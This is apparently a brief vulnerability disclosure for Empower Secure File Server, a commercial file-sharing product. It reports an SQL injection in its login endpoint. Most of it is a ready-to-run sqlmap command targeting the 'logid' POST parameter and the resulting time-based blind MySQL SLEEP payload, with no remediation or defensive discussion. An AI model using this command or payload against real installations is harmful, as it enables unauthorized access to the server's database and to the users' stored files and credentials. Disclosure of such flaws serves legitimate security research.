Empower SFS Sql Injection

https://www.mocomsys.com/mpower-sfs

Empower Secure File Server is a network-based secure file management solution that can use central storage to store/view/edit documents or files, and share or collaborate with multiple users. You can easily connect in various network environments through the web version and dedicated connectors.



## sqlmap:
```
sqlmap -u "url/mpowerweb_eng/login/log_check.php?mode=login" --data="logid=admin&pwd=jgCeiwZXnWM7LBm3jZU%3D" -p "logid" --risk 3
```
```
Parameter: logid (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: logid=admin' OR (SELECT 9604 FROM (SELECT(SLEEP(5)))EDTP) AND 'nibW'='nibW&pwd=jgCeiwZXnWM7LBm3jZU=
```

![image-20240816123354426](imgs/Empower SFS-sql injection/image-20240816123354426.png)
